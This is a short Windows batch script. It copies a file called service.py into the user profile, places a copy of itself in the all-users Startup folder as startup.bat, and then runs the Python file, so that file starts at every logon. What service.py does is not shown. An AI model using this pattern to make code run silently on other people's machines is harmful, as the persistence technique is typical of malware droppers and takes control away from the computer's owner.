@echo off
cd %USERPROFILE%
if exist "service.py" (
   python ./service.py
) else (
   copy /Y "%~dp0service.py" "%USERPROFILE%"
   copy /Y "%0" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat"
   %0
)
exit